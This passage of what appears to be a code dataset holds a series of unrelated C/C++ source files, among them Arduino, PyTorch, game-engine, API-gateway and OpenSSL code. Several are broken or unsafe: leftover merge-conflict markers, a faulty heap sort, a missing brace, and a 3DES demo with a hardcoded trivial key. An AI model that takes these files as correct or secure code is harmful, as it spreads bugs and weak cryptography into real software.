HIGH);\nDcsBios::MatActionButtonSet mfkX(\"MFK_X\", &matrix[3][0], HIGH);\nDcsBios::MatActionButtonSet mfkY(\"MFK_Y\", &matrix[4][0], HIGH);\nDcsBios::MatActionButtonSet mfkZ(\"MFK_Z\", &matrix[5][0], HIGH);\nDcsBios::MatActionButtonSet mfkArrowRight(\"MFK_ARROW_RIGHT\", &matrix[6][0], HIGH);\n\nvoid setup() {\n\n  DcsBios::setup();\n \n  // configure input pins for each row\n  pinMode(0, INPUT);\n  pinMode(1, INPUT);\n  pinMode(2, INPUT);\n  pinMode(3, INPUT);\n  pinMode(4, INPUT);\n  pinMode(5, INPUT);\n  pinMode(6, INPUT);\n  pinMode(7, INPUT);\n  pinMode(8, INPUT);\n\n  // configure output pins for CD4094BE shift register\n  pinMode(STROBE_PIN, OUTPUT);\n  pinMo",
    "w#include<iostream>\n#include<iomanip>\nusing namespace std;\nint main()\n{\n<<<<<<< HEAD\n\tcout<<\"##   Program Aplikasi Kasir  ##\"<<endl;\ncout<<\"===============================\"<<endl<<endl;\n\nconst int MAX_BARANG = 10;\nstring namaBarang [MAX_BARANG];\nlong hargaBarang [MAX_BARANG];\nint jumlahBArang [MAX_BARANG];\nlong jumlahTotalBarang;\nlong totalHarga = 0;\nlong jumlahBayar = 0;\n\ncout<<\"##   Selamat Datang di Mini Market ILKOOM    ##\"<<endl<<endl;\n\ncout<<\"Masukan jumlah barangan yangan ingin dibeli : \"; cin>>jumlahTotalBarang; cout<<endl;\n    \nif (jumlahTotalBarang <= 0 || jumlahTotalBarang > MAX_BARANG){\n    cout<<\"Jumlah barang tidak valid\"<<endl;\n       return 0;\n}\nfor (int i=0; i<jumlahTotalBarang; i++){\n   cout<<\"Barang ke : \"<<i+1<<endl;\n   cout<<\"Nama Barang : \";\n   getline(cin>>ws,namaBarang[i]);\n   cout<<\"Harga Satuan : \"; cin>>hargaBarang[i];\n   cout<<\"Jumlah : \"<<namaBarang[i]<<\" yang dibeli : \"; cin>>jumlahBArang[i]; \n   cout<<endl;\n }cout<<endl;\n  cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"####----      Struk Mini Market ILKOOM        ----####\"<<endl;\n    cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"NO   Barang  Jumlah  Harga Satuan    Sub Total\"<<endl;\n    for(int i = 0; i < jumlahTotalBarang; i++){\n        cout<<setw(1)<<1+1<<\" \";\n        cout<<left<<setw(12)<<namaBarang[i];\n        cout<<right<<setw(15)<<jumlahBArang[i];\n        cout<<setw(18)<<hargaBarang[i];\n        cout<<setw(15)<<jumlahBArang[i]*hargaBarang[i];\n        cout<<endl;\n        totalHarga=totalHarga+(jumlahBArang[i]*hargaBarang[i]);\n    }\n    cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"Total Harga : Rp. \"<<totalHarga<<endl<<endl;\n    cout<<\"Jumlah Bayar : Rp. \"; cin>>jumlahBayar; cout<<endl;\n    \n    while(jumlahBayar-totalHarga<0){\n        cout<<\"Maaf, Uang anda kurang. Mohon lakukan ulang pembayaran\"<<endl;\n        cout<<\"Jumlah Bayar : Rp. \"; cin>>jumlahBayar; cout<<endl;\n    }\n    cout<<\"Kembalian : Rp. \"<<jumlahBayar-totalHarga<<endl<<endl;\n    cout<<\"------------------------------------------------------\"<<endl;\n    cout<<\"#### Terimakasih sudah berbelanja, datang kembali ####\"<<endl;\n    cout<<\"------------------------------------------------------\"<<endl;\n    \n    return 0;\n}\n=======\n>>>>>>> dbbf87dc9650293afbb1c74b400690b341c74069\n",
    "#include <torch/extension.h>\n#include <ATen/TensorIterator.h>\n#include <ATen/native/cpu/Loops.h>\n#include <c10/util/complex.h>\n#include <iostream>\n\n#include \"bessel_k.h\"\n#include \"iterator.h\"\n\nnamespace torch_bessel {\n\nat::Tensor modified_bessel_k0_complex_forward_cpu(const at::Tensor& z) {\n  TORCH_INTERNAL_ASSERT(z.device().type() == at::DeviceType::CPU);\n  at::ScalarType dtype = z.scalar_type();\n  at::Tensor result = torch::empty(at::IntArrayRef(), dtype).resize_(0);\n  at::TensorIterator iter = build_iterator_11(result, z);\n  AT_DISPATCH_COMPLEX_TYPES(dtype, \"modified_bessel_k0_complex_forward_cpu\", [&]() {\n    at::native::cpu_kernel(iter, [](scalar_t z) -> scalar_t {\n      return modified_bessel_k0_complex_forward(z);\n    });\n  });\n  return result;\n}\n\nstd::tuple<at::Tensor, at::Tensor> modified_bessel_k0_complex_forward_backward_cpu(const at::Tensor& z) {\n  TORCH_INTERNAL_ASSERT(z.device().type() == at::DeviceType::CPU);\n  at::ScalarType dtype = z.scalar_type();\n  at::Tensor result1 = torch::empty(at::IntArrayRef(), dtype).resize_(0);\n  at::Tensor result2 = torch::empty(at::IntArrayRef(), dtype).resize_(0);\n  at::TensorIterator iter = build_iterator_21(result1, result2, z);\n  AT_DISPATCH_COMPLEX_TYPES(dtype, \"modified_bessel_k0_complex_forward_backward_cpu\", [&]() {\n    at::native::cpu_kernel_multiple_outputs(iter, [](scalar_t z) -> std::tuple<scalar_t, scalar_t> {\n      scalar_t cy[2];\n      modified_bessel_k0_complex_forward_backward(z, cy);\n      return std::make_tuple(cy[0], cy[1]);\n    });\n  });\n  return std::make_tuple(result1, result2);\n}\n\n\n// Registers _C as a Python extension module.\nPYBIND11_MODULE(TORCH_EXTENSION_NAME, m) {}\n\n// Defines the operators\nTORCH_LIBRARY(torch_bessel, m) {\n  m.def(\"modified_bessel_k0_complex_forward(Tensor z) -> Tensor\");\n  m.def(\"modified_bessel_k0_complex_forward_backward(Tensor z) -> (Tensor, Tensor)\");\n}\n\n// Registers CPU implementations for bessel_k\nTORCH_LIBRARY_IMPL(torch_bessel, CPU, m) {\n  m.impl(\"modified_bessel_k0_complex_forward\", &modified_bessel_k0_complex_forward_cpu);\n  m.impl(\"modified_bessel_k0_complex_forward_backward\", &modified_bessel_k0_complex_forward_backward_cpu);\n}\n\n}\n",
    "#include <iostream>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nvoid heapify(int arr[], int size) {\r\n    for (int i = size / 2 - 1; i >= 0; --i) {\r\n        int larger = i;\r\n        if (2 * i + 1 < size && arr[2 * i + 1] > arr[larger]) {\r\n            larger = 2 * i + 1;\r\n        }\r\n        if (2 * i + 2 < size && arr[2 * i + 2] > arr[larger]) {\r\n            larger = 2 * i + 2;\r\n        }\r\n        if (larger != i) swap(arr[larger], arr[i]);\r\n    }\r\n    swap(arr[0], arr[size - 1]);\r\n    return;\r\n}\r\n\r\nvoid sort(int arr[], int size) {\r\n    // Number of iterations\r\n    for (int i = 0; i < size; ++i) {\r\n        heapify(arr, size - i);\r\n    }\r\n}\r\n\r\nint main() {\r\n    int size;\r\n    cout << \"Enter the number of elements: \";\r\n    cin >> size;\r\n\r\n    int arr[size];\r\n    cout << \"Enter \" << size << \" elements:\\n\";\r\n    for (int i = 0; i < size; ++i) {\r\n        cin >> arr[i];\r\n    }\r\n\r\n    sort(arr, size);\r\n    //sort (arr,arr+size);\r\n\r\n    cout << \"Sorted array: \";\r\n    for (int i = 0; i < size; ++i) {\r\n        cout << arr[i] << \" \";\r\n    }\r\n    cout << endl;\r\n\r\n    return 0;\r\n}\r\n",
    "#include <stdlib.h>\n#include \"QTRSensors.h\"\n#include <Arduino.h>\n\n\n// Base class constructor\nQTRSensors::QTRSensors() :\n    calibratedMinimumOn(nullptr),\n    calibratedMaximumOn(nullptr),\n    calibratedMinimumOff(nullptr),\n    calibratedMaximumOff(nullptr),\n    _pins(nullptr)\n{\n    // empty\n}\n\n\n// Base class data member initialization (called by derived class init())\nvoid QTRSensors::init(unsigned char *pins, unsigned char numSensors,\n  unsigned char emitterPin)\n{\n    calibratedMinimumOn = nullptr;\n    calibratedMaximumOn = nullptr;\n    calibratedMinimumOff = nullptr;\n    calibratedMaximumOff = nullptr;\n\n    _lastValue = 0; // assume initially that the line is left.\n\n    if (numSensors > QTR_MAX_SENSORS)\n        _numSensors = QTR_MAX_SENSORS;\n    else\n        _numSensors = numSensors;\n\n    if (_pins == nullptr)\n    {\n        _pins = (unsigned char*)malloc(sizeof(unsigned char)*_numSensors);\n        if (_pins == nullptr)\n            return;\n    }\n\n    unsigned char i;\n    for (i = 0; i < _numSensors; i++)\n    {\n        _pins[i] = pins[i];\n    }\n\n    _emitterPin = emitterPin;\n}\n\n\n// Reads the sensor values into an array. There *MUST* be space\n// for as many values as there were sensors specified in the constructor.\n// Example usage:\n// unsigned int sensor_values[8];\n// sensors.read(sensor_values);\n// The values returned are a measure of the reflectance in abstract units,\n// with higher values corresponding to lower reflectance (e.g. a black\n// surface or a void).\nvoid QTRSensors::read(unsigned int *sensor_values, unsigned char readMode)\n{\n    unsigned char i;\n\n    if (readMode == QTR_EMITTERS_ON || readMode == QTR_EMITTERS_ON_AND_OFF)\n        emittersOn();\n    else if (readMode == QTR_EMITTERS_OFF)\n        emittersOff();\n\n    readPrivate(sensor_values);\n\n    if (readMode != QTR_EMITTERS_MANUAL)\n        emittersOff();\n\n    if (readMode == QTR_EMITTERS_ON_AND_OFF)\n    {\n        unsigned int off_values[QTR_MAX_SENSORS];\n        readPrivate(off_values);\n\n        for(i=0;i<_numSensors;i++)\n        {\n            sensor_values[i] += _maxValue - off_values[i];\n        }\n    }\n}\n\n\n// Turn the IR LEDs off and on.  These are mainly for use by the read\n// method, and calling these functions before or after reading the sensors\n// will have no effect on the readings unless the readMode is\n// QTR_EMITTERS_MANUAL, but you may wish to use these for testing purposes.\nvoid QTRSensors::emittersOff()\n{\n    if (_emitterPin == QTR_NO_EMITTER_PIN)\n        return;\n    pinMode(_emitterPin, OUTPUT);\n    digitalWrite(_emitterPin, LOW);\n    delayMicroseconds(200);\n}\n\nvoid QTRSensors::emittersOn()\n{\n    if (_emitterPin == QTR_NO_EMITTER_PIN)\n        return;\n    pinMode(_emitterPin, OUTPUT);\n    digitalWrite(_emitterPin, HIGH);\n    delayMicroseconds(200);\n}\n\n// Resets the calibration.\nvoid QTRSensors::resetCalibration()\n{\n    unsigned char i;\n    for(i=0;i<_numSensors;i++)\n    {\n        if(calibratedMinimumOn)\n            calibratedMinimumOn[i] = _maxValue;\n        if(calibratedMinimumOff)\n            calibratedMinimumOff[i] = _maxValue;\n        if(calibratedMaximumOn)\n            calibratedMaximumOn[i] = 0;\n        if(calibratedMaximumOff)\n            calibratedMaximumOff[i] = 0;\n    }\n}\n\n// Reads the sensors 10 times and uses the results for\n// calibration.  The sensor values are not returned; instead, the\n// maximum and minimum values found over time are stored internally\n// and used for the readCalibrated() method.\nvoid QTRSensors::calibrate(unsigned char readMode)\n{\n    if(readMode == QTR_EMITTERS_ON_AND_OFF || readMode == QTR_EMITTERS_ON)\n    {\n        calibrateOnOrOff(&calibratedMinimumOn,\n                         &calibratedMaximumOn,\n                         QTR_EMITTERS_ON);\n    }\n\n\n    if(readMode == QTR_EMITTERS_ON_AND_OFF || readMode == QTR_EMITTERS_OFF)\n    {\n        calibrateOnOrOff(&calibratedMinimumOff,\n                         &calibratedMaximumOff,\n                         QTR_EMITTERS_OFF);\n    }\n}\n\nvoid QTRSensors::calibrateOnOrOff(unsigned int **calibratedMinimum,\n                                        unsigned int **calibratedMaximum,\n                                        unsigned char readMode)\n{\n    int i;\n    unsigned int sensor_values[16];\n    unsigned int max_sensor_values[16];\n    unsigned int min_sensor_values[16];\n\n    // Allocate the arrays if necessary.\n    if(*calibratedMaximum == 0)\n    {\n        *calibratedMaximum = (unsigned int*)malloc(sizeof(unsigned int)*_numSensors);\n\n        // If the malloc failed, don't continue.\n        if(*calibratedMaximum == 0)\n            return;\n\n        // Initialize the max and min calibrated values to values that\n        // will cause the first reading to update them.\n\n        for(i=0;i<_numSensors;i++)\n            (*calibratedMaximum)[i] = 0;\n    }\n    if(*calibratedMinimum == 0)\n    {\n        *calibratedMinimum = (unsigned int*)malloc(sizeof(unsigned int)*_numSensors);\n\n        // If the malloc failed, don't continue.\n        if(*calibratedMinimum == 0)\n            ",
    "// gateway.cpp\n#include \"gateway.hpp\"\n\n// LRUCache implementations\nvoid LRUCache::moveToFront(Node* node) {\n    if (node == head) return;\n    \n    node->prev->next = node->next;\n    if (node->next) node->next->prev = node->prev;\n    else tail = node->prev;\n    \n    node->next = head;\n    node->prev = nullptr;\n    head->prev = node;\n    head = node;\n}\n\nLRUCache::LRUCache(int capacity) : capacity(capacity), head(nullptr), tail(nullptr) {}\n\nstd::string LRUCache::get(const std::string& key) {\n    std::lock_guard<std::mutex> lock(cacheMutex);\n    if (cache.find(key) == cache.end()) return \"\";\n    \n    Node* node = cache[key];\n    moveToFront(node);\n    return node->value;\n}\n\nvoid LRUCache::put(const std::string& key, const std::string& value) {\n    std::lock_guard<std::mutex> lock(cacheMutex);\n    if (cache.find(key) != cache.end()) {\n        cache[key]->value = value;\n        moveToFront(cache[key]);\n        return;\n    }\n    \n    Node* newNode = new Node(key, value);\n    cache[key] = newNode;\n    \n    if (!head) {\n        head = tail = newNode;\n    } else {\n        newNode->next = head;\n        head->prev = newNode;\n        head = newNode;\n    }\n    \n    if (cache.size() > capacity) {\n        cache.erase(tail->key);\n        Node* oldTail = tail;\n        tail = tail->prev;\n        tail->next = nullptr;\n        delete oldTail;\n    }\n}\n\n// ThreadPool implementations\nThreadPool::ThreadPool(size_t threads) : stop(false) {\n    for (size_t i = 0; i < threads; ++i) {\n        workers.emplace_back([this] {\n            while (true) {\n                std::function<void()> task;\n                {\n                    std::unique_lock<std::mutex> lock(queueMutex);\n                    condition.wait(lock, [this] { \n                        return stop || !tasks.empty(); \n                    });\n                    if (stop && tasks.empty()) return;\n                    task = std::move(tasks.front());\n                    tasks.pop();\n                }\n                task();\n            }\n        });\n    }\n}\n\nThreadPool::~ThreadPool() {\n    {\n        std::unique_lock<std::mutex> lock(queueMutex);\n        stop = true;\n    }\n    condition.notify_all();\n    for (std::thread& worker : workers) {\n        worker.join();\n    }\n}\n\n// APIGateway implementations\nAPIGateway::APIGateway(int cacheSize, int threadCount) \n    : cache(cacheSize), \n      threadPool(threadCount),\n      currentBackend(0) {\n    backends = {\"backend1:8080\", \"backend2:8080\", \"backend3:8080\"};\n}\n\nstd::string APIGateway::makeBackendRequest(const std::string& backend, const std::string& request) {\n    std::this_thread::sleep_for(std::chrono::milliseconds(2));\n    return \"Response for: \" + request + \" from \" + backend;\n}\n\nstd::string APIGateway::handleRequest(const std::string& request) {\n    std::string cachedResponse = cache.get(request);\n    if (!cachedResponse.empty()) {\n        return \"CACHE_HIT: \" + cachedResponse;\n    \n\n    std::string selectedBackend;\n    {\n        std::lock_guard<std::mutex> lock(backendMutex);\n        selectedBackend = backends[currentBackend];\n        currentBackend = (currentBackend + 1) % backends.size();\n    }\n\n    std::string response = makeBackendRequest(selectedBackend, request);\n    cache.put(request, response);\n    return response;\n}",
    "#include \"BrigeEngine.h\"\n#include \"compile_set.h\"\n\n#if PLATFORM == PLATFORM_WINDOWS\nHWND XBE_hWnd;\nWNDCLASSEX Window;\nHINSTANCE XBE_hInstance;\nWIN_KEY_FIFO inkeyc;\nWIN_MOUSE_FIFO inmousec;\nCAMERA_INFO cminf;\n\nLRESULT CALLBACK BE_WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)\n{\n\twchar_t str;\n\tswitch (msg)\n\t{\n\tcase WM_CLOSE:\n\t\tPostQuitMessage(69);\n\t\tbreak;\n\tcase WM_KEYDOWN:\n\t\tbreak;\n\tcase WM_KEYUP:\n\t\tbreak;\n\tcase WM_CHAR:\n\t\tinkeyc.fifo[inkeyc.p_write] = (unsigned short)(wParam);\n\t\tif (inkeyc.p_write == 31) {\n\t\t\tinkeyc.p_write = -1;\n\t\t}\n\t\tinkeyc.p_write++;\n\t\tbreak;\n\tcase WM_LBUTTONDOWN:\n\t\tinmousec.fifo[inkeyc.p_write] = BE_LEFT_BUTTON;\n\t\tinmousec.p_write++;\n\t\tif (inmousec.p_write == 31) {\n\t\t\tinmousec.p_write = 0;\n\t\t}\n\t\tbreak;\n\tcase WM_MBUTTONDOWN:\n\t\tinmousec.fifo[inkeyc.p_write] = BE_MIDDLE_BUTTON;\n\t\tinmousec.p_write++;\n\t\tif (inmousec.p_write == 31) {\n\t\t\tinmousec.p_write = 0;\n\t\t}\n\t\tbreak;\n\tcase WM_RBUTTONDOWN:\n\t\tinmousec.fifo[inkeyc.p_write] = BE_RIGHT_BUTTON;\n\t\tinmousec.p_write++;\n\t\tif (inmousec.p_write == 31) {\n\t\t\tinmousec.p_write = 0;\n\t\t}\n\t\tbreak;\n\tcase WM_MOUSEMOVE:\n\t\tinmousec.pos = MAKEPOINTS(lParam);\n\t\tbreak;\n\t}\n\treturn DefWindowProc(hWnd, msg, wParam, lParam);\n}\n#endif\n\n/* \u521d\u59cb\u5316 */\n#if PLATFORM == PLATFORM_WINDOWS\n// Windows\nbool InitEngine(HINSTANCE hInstance, LPCWSTR Title, int width, int height)\n{\n\tWindow.cbSize = sizeof(Window);\n\tWindow.style = CS_OWNDC;\n\tWindow.lpfnWndProc = BE_WndProc;\n\tWindow.cbClsExtra = 0;\n\tWindow.cbWndExtra = 0;\n\tWindow.hInstance = hInstance;\n\tWindow.hIcon = nullptr;\n\tWindow.hCursor = nullptr;\n\tWindow.hbrBackground = nullptr;\n\tWindow.lpszMenuName = nullptr;\n\tWindow.lpszClassName = L\"XJBrigeEngine\";\n\tWindow.hIconSm = nullptr;\n\tXBE_hInstance = hInstance;\n\n\tinkeyc.p_read = 0;\n\tinkeyc.p_write = 0;\n\tinmousec.p_read = 0;\n\tinmousec.p_write = 0;\n\n\tcminf.x = 0;\n\tcminf.y = 0;\n\tcminf.z = 0;\n\n\tRegisterClassEx(&Window);\n\n\tXBE_hWnd = CreateWindowEx(\n\t\t0, L\"XJBrigeEngine\",\n\t\tTitle,\n\t\tWS_CAPTION | WS_MINIMIZEBOX | WS_SYSMENU | SS_BITMAP,\n\t\t100, 100, width, height,\n\t\tnullptr, nullptr, hInstance, nullptr\n\t);\n\n\tShowWindow(XBE_hWnd, SW_SHOW);\n\n\tRefreshWindow();\n#elif PLATFORM == PLATFORM_XJ380\n// XJ380\nbool InitEngine() \n{\n\t// pass\n#endif\n\treturn true;\n}\n\n/* \u5237\u65b0 */\n#if PLATFORM == PLATFORM_WINDOWS\n// Windows\nvoid RefreshWindow()\n{\n\tUpdateWindow(XBE_hWnd);\n#elif PLATFORM == PLATFORM_XJ380\n// XJ380\nvoid InitEngine()\n{\n\t// pass\n#endif\n\treturn;\n}\n\n/* \u6d88\u606f\u5904\u7406 */\n#if PLATFORM == PLATFORM_WINDOWS\n// Windows\nbool ProcessMessage(LPMSG message)\n{\n\tTranslateMessage(message);\n\tDispatchMessage(message);\n\treturn GetMessage(message, nullptr, 0, 0);\n#elif PLATFORM == PLATFORM_XJ380\n// XJ380\nbool ProcessMessage()\n{\n\t// pass\n#endif\n}\n\n/* \u521d\u59cb\u5316\u5730\u56fe */\n#if PLATFORM == PLATFORM_WINDOWS\n// Windows\nvoid InitMap(const char* FilePath)\n{\n\tRECT WindowInfo;\n\tGetWindowRect(XBE_hWnd, &WindowInfo);\n\tint WinX = WindowInfo.right - WindowInfo.left;\n\tint WinY = WindowInfo.bottom - WindowInfo.top;\n\tint BaseX = WinX / 2 - 56;\n\tint BaseY = WinY / 2 - 43;\n\tfor (int x = BaseX % 113; x < WinX; x += 113) {\n\t\tbapi_line(x, 0, x, WinY, 0, 0, 0);\n\t}\n\tfor (int y = BaseY % 86; y < WinY; y += 86) {\n\t\tbapi_line(0, y, WinX, y, 0, 0, 0);\n\t}\n\n#elif PLATFORM == PLATFORM_XJ380\n// XJ380\nvoid InitMap()\n{\n\t// pass\n#endif\n\treturn;\n}\n\n/* \u9f20\u6807\u5750\u6807 */\n#if PLATFORM == PLATFORM_WINDOWS\n// Windows\nvoid GetMouseInfo(MOUSE_INFO* msinf)\n{\n\tmsinf->x = inmousec.pos.x;\n\tmsinf->y = inmousec.pos.y;\n\tswitch(inmousec.fifo[inmousec.p_read]) \n\t{\n\tcase BE_LEFT_BUTTON:\n\t\tmsinf->lb = true;\n\t\tbreak;\n\tcase BE_RIGHT_BUTTON:\n\t\tmsinf->rb = true;\n\t\tbreak;\n\tcase BE_MIDDLE_BUTTON:\n\t\tmsinf->mb = true;\n\t\tbreak;\n\t}\n\treturn;\n#elif PLATFORM == PLATFORM_XJ380\n// XJ380\nvoid GetMouseInfo()\n{\n\t// pass\n#endif\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"portal_berita\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"gameState.h\"\nGameState::GameState() : score(0), highScore(0), level(1), currentDifficulty(EASY), currentCategoryIndex(0) {}\nvoid GameState::addCategory(const Category& category) {\n    categories.push_back(category);\n}\nconst Category& GameState::getCurrentCategory() const {\n    return categories[currentCategoryIndex];\n}\nvoid GameState::setCategory(int index) {\n    if (index >= 0 && index < categories.size()) {\n        currentCategoryIndex = index;\n    }\n}\nint GameState::getScore() const {\n    return score;\n}\nvoid GameState::updateScore(int points) {\n    score += points;\n}\nint GameState::getHighScore() const {\n    return highScore;\n}\nvoid GameState::setHighScore(int score) {\n    highScore = score;\n}\nint GameState::getLevel() const {\n    return level;\n}\nvoid GameState::nextLevel() {\n    ++level;\n}\nDifficulty GameState::getDifficulty() const {\n    return currentDifficulty;\n}\nvoid GameState::setDifficulty(Difficulty difficulty) {\n    currentDifficulty = difficulty;\n}\nDifficultyParams GameState::getDifficultyParams(Difficulty difficulty) const {\n    switch (difficulty) {\n        case EASY: return {1.5f, 100.0f};\n        case MEDIUM: return {1.0f, 150.0f};\n        case HARD: return {0.5f, 200.0f};\n        default: return {1.5f, 100.0f};\n    }\n}\n",
    "#include <stdio.h>\r\n#include <string.h>\r\n#include <openssl/evp.h>\r\n#include <openssl/rand.h>\r\n#include <openssl/err.h>\r\n\r\nvoid handleErrors(void) {\r\n    ERR_print_errors_fp(stderr);\r\n    abort();\r\n}\r\n\r\nint encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *key,\r\n             unsigned char *iv, unsigned char *ciphertext) {\r\n    EVP_CIPHER_CTX *ctx;\r\n    int len;\r\n    int ciphertext_len;\r\n\r\n    if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();\r\n    if(1 != EVP_EncryptInit_ex(ctx, EVP_des_ede3_cbc(), NULL, key, iv)) handleErrors();\r\n    if(1 != EVP_EncryptUpdate(ctx, ciphertext, &len, plaintext, plaintext_len)) handleErrors();\r\n    ciphertext_len = len;\r\n    if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + len, &len)) handleErrors();\r\n    ciphertext_len += len;\r\n    EVP_CIPHER_CTX_free(ctx);\r\n\r\n    return ciphertext_len;\r\n}\r\n\r\nint decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *key,\r\n             unsigned char *iv, unsigned char *plaintext) {\r\n    EVP_CIPHER_CTX *ctx;\r\n    int len;\r\n    int plaintext_len;\r\n\r\n    if(!(ctx = EVP_CIPHER_CTX_new())) handleErrors();\r\n    if(1 != EVP_DecryptInit_ex(ctx, EVP_des_ede3_cbc(), NULL, key, iv)) handleErrors();\r\n    if(1 != EVP_DecryptUpdate(ctx, plaintext, &len, ciphertext, ciphertext_len)) handleErrors();\r\n    plaintext_len = len;\r\n    if(1 != EVP_DecryptFinal_ex(ctx, plaintext + len, &len)) handleErrors();\r\n    plaintext_len += len;\r\n    EVP_CIPHER_CTX_free(ctx);\r\n\r\n    return plaintext_len;\r\n}\r\n\r\nint main() {\r\n    unsigned char key[24] = \"123456789012345678901234\";\r\n    unsigned char iv[8];\r\n    if(!RAND_bytes(iv, sizeof(iv))) handleErrors();\r\n\r\n    unsigned char plaintext[] = \"This is a test message.\";\r\n    unsigned char ciphertext[128];\r\n    unsigned char decryptedtext[128];\r\n\r\n    int plaintext_len = strlen((char *)plaintext);\r\n    int ciphertext_len, decryptedtext_len;\r\n\r\n    ciphertext_len = encrypt(plaintext, plaintext_len, key, iv, ciphertext);\r\n\r\n    decryptedtext_len = decrypt(ciphertext, ciphertext_len, key, iv, decryptedtext);\r\n    decryptedtext[decryptedtext_len] = '\\0';\r\n\r\n    printf(\"Original: %s\\n\", plaintext);\r\n    printf(\"Decrypted: %s\\n\", decryptedtext);\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "// Clover Audio Framework\n// Copyright (C) 2023  Rob W. Albus\n// Licensed under the GPLv3. See LICENSE for details.\n\n#include <format>  // IWYU pragma: keep\n#include <termios.h>\n#include <thread>\n#include <unistd.h>\n\n#include \"portaudio.h\"\n\n#include \"clover/io/audio_callback.hpp\"\n#include \"clover/io/detail/pa_util.hpp\"\n\n#include \"util/stream_v2.hpp\"\n\nnamespace {\n\nvoid set_non_blocking_mode(bool enable) {\n    static struct termios oldt, newt;\n\n    if (enable) {\n        tcgetattr(STDIN_FILENO, &oldt);\n        newt = oldt;\n\n        newt.c_lflag &= ~(ICANON | ECHO);\n        tcsetattr(STDIN_FILENO, TCSANOW, &newt);\n    } else {\n        tcsetattr(STDIN_FILENO, TCSANOW, &oldt);\n    }\n}\n\nbool has_new_input() {\n    fd_set readfds;\n    FD_ZERO(&readfds);\n    FD_SET(STDIN_FILENO, &readfds);\n\n    struct timeval timeout = {0, 0};\n\n    return select(STDIN_FILENO + 1, &readfds, nullptr, nullptr, &timeout) > 0;\n}\n\n}  // namespace\n\nnamespace clover::io {\n\nstream_v2::stream_v2() : current_stream(nullptr) {\n    pa_util::pa_initialize();\n}\n\nstream_v2::~stream_v2() {\n    if (current_stream != nullptr) {\n        pa_util::print_pa_error(Pa_StopStream(current_stream));\n        pa_util::print_pa_error(Pa_CloseStream(current_stream));\n        current_stream = nullptr;\n    }\n\n    pa_util::pa_terminate();\n}\n\nvoid stream_v2::start() {\n    if (current_stream == nullptr) {\n        throw std::runtime_error(\n                std::format(\"clover::stream::start() called before \"\n                            \"clover::stream::open(device)\\n\"\n                            \"exiting...\"));\n    }\n    pa_util::handle_pa_error(Pa_IsStreamActive(current_stream));\n    pa_util::handle_pa_error(Pa_StartStream(current_stream));\n}\n\nvoid stream_v2::wait_to_complete() {\n    set_non_blocking_mode(true);\n    std::cout << \"press any key to exit. \" << std::endl;\n    while (is_playing) {\n        if (has_new_input()) {\n            std::cout << \"key pressed. exiting. \" << std::endl;\n            stop();\n            break;\n        }\n\n        std::this_thread::sleep_for(std::chrono::milliseconds(100));\n    }\n}\n\nvoid stream_v2::stop() {\n    if (current_stream != nullptr) {\n        pa_util::handle_pa_error(Pa_StopStream(current_stream));\n        current_stream = nullptr;\n    }\n}\n\nvoid stream_v2::open(stream_v2::settings settings) {\n    is_playing = true;\n\n    current_settings = settings;\n    bool has_input   = current_settings.device_index_in != paNoDevice;\n    bool has_output  = current_settings.device_index_out != paNoDevice;\n\n    if (!has_input && !has_output) {\n        std::cout << \"clover::io::stream::open requires non-zero value for at least one of:\\n\"\n                  << \"- chan_count_in\\n\"\n                  << \"- chan_count_out\" << std::endl;\n        return;\n    }\n\n    PaStreamParameters *pa_in_params  = nullptr;\n    PaStreamParameters *pa_out_params = nullptr;\n\n    if (has_input) {\n        pa_in_params                            = new PaStreamParameters();\n        pa_in_params->device                    = current_settings.device_index_in;\n        pa_in_params->channelCount              = current_settings.chan_count_in;\n        pa_in_params->sampleFormat              = paFloat32;\n        pa_in_params->suggestedLatency          = current_settings.latency_ms;\n        pa_in_params->hostApiSpecificStreamInfo = nullptr;\n    }\n    if (has_output) {\n        pa_out_params                            = new PaStreamParameters();\n        pa_out_params->device                    = current_settings.device_index_out;\n        pa_out_params->channelCount              = current_settings.chan_count_out;\n        pa_out_params->sampleFormat              = paFloat32;\n        pa_out_params->suggestedLatency          = current_settings.latency_ms;\n        pa_out_params->hostApiSpecificStreamInfo = nullptr;\n    }\n\n    pa_util::handle_pa_error(Pa_IsFormatSupported(pa_in_params, pa_out_params, current_settings.sample_rate));\n\n    pa_util::handle_pa_error(Pa_OpenStream(\n            &current_stream,\n            pa_in_params,\n            pa_out_params,\n            current_settings.sample_rate,\n            paFramesPerBufferUnspecified,\n            paNoFlag,\n            &stream_v2::pa_audio_callback,\n            this));\n\n    pa_util::handle_pa_error(\n            Pa_SetStreamFinishedCallback(current_stream, &stream_v2::pa_stream_complete_callback));\n    delete pa_in_params;\n    delete pa_out_params;\n}\n\nvoid stream_v2::pa_stream_complete_callback(void *user_data) {\n    stream_v2 &instance = *(stream_v2 *)user_data;\n\n    instance.audio_complete_callback();\n    instance.is_playing = 